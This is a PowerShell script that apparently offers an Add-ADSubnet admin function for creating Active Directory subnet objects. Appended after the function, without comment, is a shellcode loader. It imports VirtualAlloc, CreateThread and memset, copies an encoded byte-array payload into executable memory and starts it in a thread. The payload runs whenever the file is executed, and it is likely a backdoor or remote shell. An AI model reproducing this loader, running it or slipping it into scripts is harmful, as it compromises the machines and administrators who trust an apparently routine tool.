﻿Function Add-ADSubnet{

    [CmdletBinding()]
    PARAM(
        [Parameter(
            Mandatory=$true,
            Position=1,
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true,
            HelpMessage="Subnet name to create")]
        [Alias("Name")]
        [String]$Subnet,
        [Parameter(
            Mandatory=$true,
            Position=2,
            ValueFromPipelineByPropertyName=$true,
            HelpMessage="Site to which the subnet will be applied")]
        [Alias("Site")]
        [String]$SiteName,
        [Parameter(
            ValueFromPipelineByPropertyName=$true,
            HelpMessage="Description of the Subnet")]
        [String]$Description,
        [Parameter(
            ValueFromPipelineByPropertyName=$true,
            HelpMessage="Location of the Subnet")]
        [String]$location
    )
    PROCESS{
            TRY{
                $ErrorActionPreference = 'Stop'

                
                $Configuration = ([ADSI]"LDAP://RootDSE").configurationNamingContext

                
                $SubnetsContainer = [ADSI]"LDAP://CN=Subnets,CN=Sites,$Configuration"

                
                Write-Verbose -Message "$subnet - Creating the subnet object..."
                $SubnetObject = $SubnetsContainer.Create('subnet', "cn=$Subnet")

                
                $SubnetObject.put("siteObject","cn=$SiteName,CN=Sites,$Configuration")

                
                IF ($PSBoundParameters['Description']){
                    $SubnetObject.Put("description",$Description)
                }

                
                IF ($PSBoundParameters['Location']){
                    $SubnetObject.Put("location",$Location)
                }
                $SubnetObject.setinfo()
                Write-Verbose -Message "$subnet - Subnet added."
            }
            CATCH{
                Write-Warning -Message "An error happened while creating the subnet: $subnet"
                $error[0].Exception
            }
    }
    END{
        Write-Verbose -Message "Script Completed"
    }
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0x16,0x94,0x4c,0x80,0xd9,0xe5,0xd9,0x74,0x24,0xf4,0x5d,0x31,0xc9,0xb1,0x47,0x31,0x5d,0x13,0x03,0x5d,0x13,0x83,0xed,0xea,0x76,0xb9,0x7c,0xfa,0xf5,0x42,0x7d,0xfa,0x99,0xcb,0x98,0xcb,0x99,0xa8,0xe9,0x7b,0x2a,0xba,0xbc,0x77,0xc1,0xee,0x54,0x0c,0xa7,0x26,0x5a,0xa5,0x02,0x11,0x55,0x36,0x3e,0x61,0xf4,0xb4,0x3d,0xb6,0xd6,0x85,0x8d,0xcb,0x17,0xc2,0xf0,0x26,0x45,0x9b,0x7f,0x94,0x7a,0xa8,0xca,0x25,0xf0,0xe2,0xdb,0x2d,0xe5,0xb2,0xda,0x1c,0xb8,0xc9,0x84,0xbe,0x3a,0x1e,0xbd,0xf6,0x24,0x43,0xf8,0x41,0xde,0xb7,0x76,0x50,0x36,0x86,0x77,0xff,0x77,0x27,0x8a,0x01,0xbf,0x8f,0x75,0x74,0xc9,0xec,0x08,0x8f,0x0e,0x8f,0xd6,0x1a,0x95,0x37,0x9c,0xbd,0x71,0xc6,0x71,0x5b,0xf1,0xc4,0x3e,0x2f,0x5d,0xc8,0xc1,0xfc,0xd5,0xf4,0x4a,0x03,0x3a,0x7d,0x08,0x20,0x9e,0x26,0xca,0x49,0x87,0x82,0xbd,0x76,0xd7,0x6d,0x61,0xd3,0x93,0x83,0x76,0x6e,0xfe,0xcb,0xbb,0x43,0x01,0x0b,0xd4,0xd4,0x72,0x39,0x7b,0x4f,0x1d,0x71,0xf4,0x49,0xda,0x76,0x2f,0x2d,0x74,0x89,0xd0,0x4e,0x5c,0x4d,0x84,0x1e,0xf6,0x64,0xa5,0xf4,0x06,0x89,0x70,0x60,0x02,0x1d,0x41,0x14,0xc8,0x76,0xdd,0xd4,0xd0,0x92,0x14,0x50,0x36,0xf2,0x78,0x32,0xe7,0xb2,0x28,0xf2,0x57,0x5a,0x23,0xfd,0x88,0x7a,0x4c,0xd7,0xa0,0x10,0xa3,0x8e,0x99,0x8c,0x5a,0x8b,0x52,0x2d,0xa2,0x01,0x1f,0x6d,0x28,0xa6,0xdf,0x23,0xd9,0xc3,0xf3,0xd3,0x29,0x9e,0xae,0x75,0x35,0x34,0xc4,0x79,0xa3,0xb3,0x4f,0x2e,0x5b,0xbe,0xb6,0x18,0xc4,0x41,0x9d,0x13,0xcd,0xd7,0x5e,0x4b,0x32,0x38,0x5f,0x8b,0x64,0x52,0x5f,0xe3,0xd0,0x06,0x0c,0x16,0x1f,0x93,0x20,0x8b,0x8a,0x1c,0x11,0x78,0x1c,0x75,0x9f,0xa7,0x6a,0xda,0x60,0x82,0x6a,0x26,0xb7,0xea,0x18,0x46,0x0b;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

